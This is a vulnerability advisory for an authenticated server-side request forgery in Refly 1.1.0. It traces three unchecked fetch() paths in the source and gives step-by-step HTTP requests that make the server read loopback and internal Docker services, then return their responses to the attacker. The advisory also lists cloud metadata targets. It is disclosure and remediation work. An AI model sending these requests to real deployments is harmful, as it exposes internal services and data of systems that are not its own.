# Server-Side Request Forgery in Refly

| Field | Value |
| --- | --- |
| Title | Authenticated SSRF via unsanitized server-side URL fetch |
| Vendor | Refly AI |
| Product | Refly (self-hosted / official Docker) |
| Affected versions | 1.1.0 (GitHub release `v1.1.0`; Docker tags `latest` and `1.1.0`) |
| Fixed versions | None at the time of this report |
| CWE | CWE-918 (Server-Side Request Forgery) |
| Attack vector | Network, authenticated (any registered user) |

## 1. CVSS

### 1.1 CVSS 3.1

| Scenario | Score | Severity | Vector |
| --- | --- | --- | --- |
| Default official Docker (internal services reachable) | **7.7** | High | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N` |
| Cloud metadata or credentialed internal APIs reachable | **9.6** | Critical | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N` |

`PR:L` because a session is required. Official self-host enables email signup without verification by default, so obtaining that session is trivial. `S:C` because the fetch runs in the API container and can reach other hosts on the Docker network and loopback. Use the Critical row only when metadata or privileged internal APIs are demonstrated.

### 1.2 CVSS 4.0

| Scenario | Score | Severity | Vector |
| --- | --- | --- | --- |
| Default official Docker | **8.3** | High | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N` |

The recommended score for this advisory is **CVSS 3.1 7.7 High** and **CVSS 4.0 8.3 High**.

## 2. Summary

Several authenticated API endpoints accept a caller-supplied URL and fetch it from the Refly API process with no allow-list, no block on private or link-local addresses, and no scheme restriction beyond what the runtime `fetch` implementation allows.

On the official Docker stack this lets a normal user reach sibling containers (object storage, vector DB, search, sandbox) and the API loopback interface. One sink stores the full response body and returns it to the caller.

Unauthenticated requests to these endpoints return `401`.

## 3. Root Cause and Code Chain

The API takes a caller-supplied URL and hands it to Node `fetch()` inside the API container. Nothing in that path:

- restricts the scheme to `http`/`https`
- resolves DNS and rejects loopback, RFC1918, link-local, or IPv6 unique-local
- blocks Docker-internal hostnames (`searxng`, `qdrant`, `minio`, `sandbox`, …)
- blocks cloud metadata hosts (`169.254.169.254`, `metadata.google.internal`, …)
- re-checks the destination after redirects

Three independent call paths share this missing check. Chain B is the high-impact one: it stores the full response body and later returns it to the attacker.

```
attacker (any registered user)
        |
        |  POST body.url  /  body.externalUrl  /  weblink URL
        v
 JWT-guarded controller   (auth only; no URL policy)
        |
        v
 service layer            (passes the string through)
        |
        v
 fetch(url) in API process   <-- request originates on the Docker network
        |
        +--> internal host / 127.0.0.1 / sibling container
        |
        v
 response body (or HTML metadata) returned to the attacker
```

### 3.1 Chain A — scrape (metadata only)

HTTP: `POST /api/v1/misc/scrape` with `{ "url": "<attacker URL>" }`

| Step | File | Lines | What happens |
| --- | --- | --- | --- |
| 1 | `apps/api/src/modules/misc/misc.controller.ts` | 37–41 | `@UseGuards(JwtAuthGuard)` then `this.miscService.scrapeWeblink(body)` |
| 2 | `apps/api/src/modules/misc/misc.service.ts` | 131–133 | `const { url } = body;` then `scrapeWeblink(url)` — no validation |
| 3 | `packages/utils/src/scrape-weblink.ts` | 4–6 | `fetch(url)` then `res.text()` |
| 4 | same file | 9–38 | Cheerio extracts `og:title` / `title`, description, image; that metadata is returned |

Sink:

```ts
// packages/utils/src/scrape-weblink.ts:4-6
export const scrapeWeblink = async (url: string) => {
  const res = await fetch(url);
  const html = await res.text();
```

This path does not return the raw body. It is enough to fingerprint internal HTTP services (title / description of the bundled search UI, API banner pages, etc.).

### 3.2 Chain B — drive import (full response body)

HTTP: `POST /api/v1/drive/file/create` with `{ canvasId, name, externalUrl }`
then `GET /api/v1/drive/file/content/:fileId`

A canvas is only a container. `POST /api/v1/canvas/create` (`apps/api/src/modules/canvas/canvas.controller.ts` 100–103) is not itself SSRF; it is required because `createDriveFile` rejects a missing `canvasId`.

| Step | File | Lines | What happens |
| --- | --- | --- | --- |
| 1 | `apps/api/src/modules/drive/drive.controller.ts` | 72–79 | `@Post('file/create')` + `JwtAuthGuard` → `driveService.createDriveFile(user, request)` |
| 2 | `apps/api/src/modules/drive/drive.service.ts` | 1335–1343 | `createDriveFile` requires `canvasId`, then calls `batchProcessDriveFileRequests` |
| 3 | same file | 416, 471–473 | Request fields include `externalUrl`. If set: `rawData = await this.downloadFileFromUrl(externalUrl)` |
| 4 | same file | 219–231 | `const response = await fetch(url);` then `Buffer.from(await response.arrayBuffer())` |
| 5 | same file | 494+ | Buffer is written to object storage and a `driveFile` row is created (`fileId` returned) |
| 6 | `apps/api/src/modules/drive/drive.controller.ts` | 135–144, 181–242 | `GET file/content/:fileId` loads that object and `res.end(data)` — full body to the caller |

Sink:

```ts
// apps/api/src/modules/drive/drive.service.ts:219-231
private async downloadFileFromUrl(url: string): Promise<Buffer> {
  if (!url) {
    throw new ParamsError('URL is required');
  }
  try {
    const response = await fetch(url);
    if (!response.ok) {
      throw new Error(`Failed to download file: ${response.status} ${response.statusText}`);
    }
    const arrayBuffer = await response.arrayBuffer();
    return Buffer.from(arrayBuffer);
```

Call site (no allow-list, no host check):

```ts
// apps/api/src/modules/drive/drive.service.ts:471-473
} else if (externalUrl) {
  // Case 3: Download from external URL
  rawData = await this.downloadFileFromUrl(externalUrl);
```

This is the path that turns SSRF into a full internal-HTTP read.

### 3.3 Chain C — weblink resource parse (secondary)

HTTP: `POST /api/v1/knowledge/resource/create` with a `weblink` resource whose `data.url` is attacker-controlled.

| Step | File | Lines | What happens |
| --- | --- | --- | --- |
| 1 | `apps/api/src/modules/knowledge/knowledge.controller.ts` | 84 | `POST resource/create` |
| 2 | `apps/api/src/modules/knowledge/resource.service.ts` | 164–168, 230–237 | `resourceType === 'weblink'` stores the URL and sets `indexStatus: 'wait_parse'` |
| 3 | same file | 531–533 | `parserFactory.createWebParser(...)` then `parser.parse(url)` |
| 4 | `apps/api/src/modules/knowledge/parsers/factory.ts` | 28–35 | Default provider is builtin `CheerioParser` |
| 5 | `apps/api/src/modules/knowledge/parsers/cheerio.parser.ts` | 36–46, 85–95 | `fetchWithTimeout(url)` → `fetch(url, { signal, headers })` |

Same missing check. The official Docker repro in section 5 uses Chain A and Chain B; Chain C is the same class of sink.

### 3.4 What is not present

There is no shared egress helper. `JwtAuthGuard` only proves the caller has a session. Official self-host sets `AUTH_SKIP_VERIFICATION=true`, so any email signup is enough.

## 4. Impact

On official `deploy/docker` (verified 2026-08-14):

1. A registered user can make the API server send HTTP requests to arbitrary URLs, including Docker-internal DNS names and `127.0.0.1`.
2. `POST /v1/misc/scrape` reflects HTML metadata from internal services (for example the bundled search UI identifies itself in `title` / `description`).
3. `POST /v1/drive/file/create` with `externalUrl` downloads the full response. `GET /v1/drive/file/content/:fileId` then returns that body to the attacker.
4. Confirmed retrieved content included an internal health string from the vector database and the API root JSON from `http://127.0.0.1:5800/`.
5. Cloud instance metadata was requested; this lab host did not expose IMDS. Treat IMDS success as a severity upgrade, not as proven here.
6. `file://` and `gopher://` were rejected by the fetch stack in this build.

## 5. Reproduction

Follow the steps in order. Each step states what to send, which field to copy, and what proves the bug.

Environment:

- Official compose, from the repo: `cd deploy/docker && cp env.example .env && docker compose up -d`
- Public base URL: `http://localhost:5700` (published port; API prefix is `/api`)
- Any unused email. Official `.env` has `AUTH_SKIP_VERIFICATION=true`, so signup is immediately usable
- On Windows PowerShell use `curl.exe`, not the `curl` alias

Internal names below are the compose service DNS names. They resolve only from inside the Docker network (i.e. from the API container). A browser on the host cannot open `http://searxng:8080/` or `http://qdrant:6333/readyz`. If those URLs return internal content through the API, the request was made server-side.

### Step 1 — Create a session

```http
POST /api/v1/auth/email/signup
Host: localhost:5700
Content-Type: application/json

{"email":"ssrf-lab@example.local","password":"SsrfTest123!"}
```

From `Set-Cookie`, copy `_rf_access=<JWT>`. Use that JWT as `Authorization: Bearer <JWT>` on every later request.

If the cookie is missing (common when the client is not on HTTPS because `REFLY_COOKIE_SECURE` is coerced to `true`), take the access token from the JSON body instead. The SSRF itself does not depend on cookies.

### Step 2 — Unauthenticated control (must fail)

Send the scrape body with **no** `Authorization` header.

```http
POST /api/v1/misc/scrape
Host: localhost:5700
Content-Type: application/json

{"url":"http://127.0.0.1:5800/"}
```

Expected: `401 Unauthorized`. The sinks are authenticated. This is not an unauthenticated SSRF.

### Step 3 — Chain A: scrape an internal hostname

```http
POST /api/v1/misc/scrape
Host: localhost:5700
Authorization: Bearer <JWT>
Content-Type: application/json

{"url":"http://searxng:8080/"}
```

Expected: `201` (or `200`) and JSON `data.title` / `data.description` taken from the **bundled SearXNG** HTML, not from a public Internet page.

Why this proves SSRF: `searxng` is compose-internal DNS. The API container resolved it and fetched it. The attacker only sees the extracted metadata, not the full HTML.

### Step 4 — Create a canvas (prerequisite for Chain B)

`createDriveFile` requires `canvasId`. This call is not the sink.

```http
POST /api/v1/canvas/create
Host: localhost:5700
Authorization: Bearer <JWT>
Content-Type: application/json

{"title":"ssrf-lab"}
```

Copy `data.canvasId` from the JSON (value looks like `can-...`).

### Step 5 — Chain B: import `externalUrl` (server fetches the full body)

```http
POST /api/v1/drive/file/create
Host: localhost:5700
Authorization: Bearer <JWT>
Content-Type: application/json

{
  "canvasId": "<canvasId from step 4>",
  "name": "internal.txt",
  "externalUrl": "http://127.0.0.1:5800/"
}
```

Expected: success and a new `data.fileId` (value looks like `df-...`).

What the server just did: `downloadFileFromUrl("http://127.0.0.1:5800/")` ran `fetch` **inside the API container**, so `127.0.0.1:5800` is the API’s own unpublished loopback listener, not the host’s localhost. The full response bytes were stored as a drive file.

### Step 6 — Read the stored body back

```http
GET /api/v1/drive/file/content/<fileId from step 5>
Host: localhost:5700
Authorization: Bearer <JWT>
```

Expected: HTTP 200 and the API root JSON, including a banner string such as `Refly API Endpoint`.

That is full-response SSRF: attacker-chosen URL → server-side `fetch` → raw body returned to the attacker.

### Step 7 — Repeat Chain B against sibling containers

Use the same steps 5–6 with a different `name` and `externalUrl` each time. Expected bodies on official compose (verified 2026-08-14):

| `externalUrl` | What comes back in `GET .../file/content/:fileId` |
| --- | --- |
| `http://127.0.0.1:5800/` | API root JSON (`Refly API Endpoint`) |
| `http://qdrant:6333/readyz` | vector-DB health text (`all shards are ready`) |
| `http://searxng:8080/` | full SearXNG HTML (several KB), not just metadata |

A host-side browser cannot reach `qdrant:6333` or `searxng:8080`. Receiving those bodies through `:5700` means the API issued the request.

### Step 8 — Negative control

Repeat steps 5–6 with `externalUrl` pointing at a host that is **not** on the Docker network (a non-existent internal name, or a public site you own). The result must differ from step 7: connection error / timeout, or ordinary public content.

Do not point this sink at systems you do not own.

### What this does and does not prove

- Proved: any registered user can make the API fetch arbitrary `http` URLs, including loopback and compose-internal services, and can read the full body via drive import.
- Not proved on this lab host: cloud instance metadata (`169.254.169.254`). Treat IMDS success as a severity upgrade, not as demonstrated here.
- `file://` and `gopher://` were rejected by the fetch stack in this build. The issue is HTTP(S) SSRF, not those schemes.

## 6. Remediation

1. Centralize egress: allow only `http`/`https`, resolve DNS, then deny loopback, RFC1918, link-local, IPv6 unique-local, and known metadata addresses (`169.254.169.254`, `metadata.google.internal`, etc.).
2. Do not follow redirects to a denied address.
3. Cap response size and time. Do not return raw internal bodies to the client unless the URL is on an allow-list.
4. Apply the same helper to scrape, drive import, weblink parse, provider `baseUrl`, and MCP server URLs.

## 7. References

| Resource | URL |
| --- | --- |
| Source repository | https://github.com/refly-ai/refly |
| Release v1.1.0 | https://github.com/refly-ai/refly/releases/tag/v1.1.0 |
| Self-host guide | https://docs.refly.ai/community-version/self-deploy |
| CWE-918 | https://cwe.mitre.org/data/definitions/918.html |

